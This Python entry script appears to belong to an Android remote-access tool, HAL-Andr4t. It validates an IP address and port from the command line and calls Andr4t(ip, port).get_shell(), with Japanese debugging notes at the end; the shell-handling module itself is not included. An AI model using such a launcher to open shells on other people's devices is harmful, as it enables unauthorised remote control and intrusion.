import sys
import argparse
from pathlib import Path

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\console')
from console import Console

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\andr4t')
from andr4t import Andr4t

#マクロ定数宣言
ARG_IP_ADDRESS_PREFIX_PLACE = 1
ARG_IP_ADDRESS_PLACE = 2
ARG_port_ADDRESS_PREFIX_PLACE = 3
ARG_port_ADDRESS_PLACE =4


#  _   _ _  _   _              _              _      _  _   _
# | | | | || | | |            / \   _ __   __| |_ __| || | | |_
# | |_| | || |_| |  _____    / _ \ | '_ \ / _` | '__| || |_| __|
# |  _  |__   _| | |_____|  / ___ \| | | | (_| | |  |__   _| |_
# |_| |_|  |_| |_|         /_/   \_\_| |_|\__,_|_|     |_|  \__|
#                                                   coded by H4l

def __args_analyze_ip(args):
    # "-a"はIPアドレス引数の先頭字
    ARG_IP_ADDRESS_PREFIX = "-a"

    IP_ADDRESS_OCTET_MAX = 4

    IP_ADDRESS_MIN = 0
    IP_ADDRESS_MAX = 255
    
    if(not args.arg1 == ARG_IP_ADDRESS_PREFIX):
        Console.printl('Please enter "-a" as the first character.')
        return False

    iplist=args.arg2.split('.')

    if(not len(iplist) is IP_ADDRESS_OCTET_MAX):
        Console.printl("There is a mistake in the description of the IP address.")
        return False

    for ip in iplist:
        try:
            if(IP_ADDRESS_MIN > int(ip) or
                IP_ADDRESS_MAX < int(ip)):
                Console.printl("error")
                return False
        except Exception as e:
            Console.printl(e)
            return False
    return True

def __args_analyze_port(args):
    # "-p"はport番号引数の先頭字
    ARG_port_ADDRESS_PREFIX = "-p"
    
    if(not args.arg3 == ARG_port_ADDRESS_PREFIX):
        Console.print('Please enter "-p" as the first character.')
        return False
    
    try:
        int(args.arg4)
    except:
        Console.printl("Please enter only numerical values for the port number")
        return False
    
    return True

"""
def get_args():
    parser = argparse.ArgumentParser(description="Get command line arguments")   #パーサー作成
    parser.add_argument("arg1",help="-a",type=str)   #引数設定
    parser.add_argument("arg2",help="IP address",type=str)
    parser.add_argument("arg3",help="-p",type=str)
    parser.add_argument("arg4",help="TCP port number",type=str)
    args = parser.parse_args()   #引数解析
    return args
"""

class get_args():
    def __init__(self):
        args = sys.argv
        self._arg1 = args[ARG_IP_ADDRESS_PREFIX_PLACE]
        self._arg2 = args[ARG_IP_ADDRESS_PLACE]
        self._arg3 = args[ARG_port_ADDRESS_PREFIX_PLACE]
        self._arg4 = args[ARG_port_ADDRESS_PLACE]
    
    @property
    def arg1(self):
        return self._arg1
    
    @property
    def arg2(self):
        return self._arg2

    @property
    def arg3(self):
        return self._arg3

    @property
    def arg4(self):
        return self._arg4

def main() -> None:
    """
    メイン処理
    """
    #args = sys.argv   #sysによる引数の取得。argsにリストで格納
    # TODO args parserを用いて、socket通信用のip, portを指定する。
    args = get_args()

    if(not __args_analyze_ip(args) or
        not __args_analyze_port(args)):
        return False

    ip=args.arg2
    port=int(args.arg4)
    
    android = Andr4t(ip,port) #androidはAndr4tのインスタンス
    android.get_shell()

if (__name__ == "__main__"):
    main()

"""
    ・args parser
    args parserでの動作確認はエラーにより失敗。
    調査結果、引数が未設定とのエラーだが-hコマンドによる確認では設定済みと出力され、原因解明できず。
    そのため今回はsysモジュールを使った設計を行った。動作は単純であり、今回の場合はこちらのほうが適しているかもしれない。
    
    ・isに付いて
    デバッグ中、42行目と67行目のif文が誤動作した。原因はisにあるのではないかと考える。
    条件式前後にprintを挟み、変数の内部についてデバッグをおこなったが正常であった。
    isを==に置き換えて動作確認を行ったところ正常に動作した。
    isと==は全く一緒のものではないのか、はたまたプログラムの記述方法に誤りがあったのかは不明...

    ・結果
    正常な入力の動作結果は[SUCCESS]であった。
    Console.printlはエラーを吐いた。原因不明...

    エラー内容:
    例外が発生しました: NotImplementedError
    Could not find signature for printl: <str>

    During handling of the above exception, another exception occurred:

    File "C:\github\HAL-Andr4t\HAL-Andr4t\main\main.py", line 43, in __args_analyze_ip
        Console.printl('Please enter "-a" as the first character.')
    File "C:\github\HAL-Andr4t\HAL-Andr4t\main\main.py", line 122, in main
        if(not __args_analyze_ip(args) or
    File "C:\github\HAL-Andr4t\HAL-Andr4t\main\main.py", line 133, in <module>
        main()
    """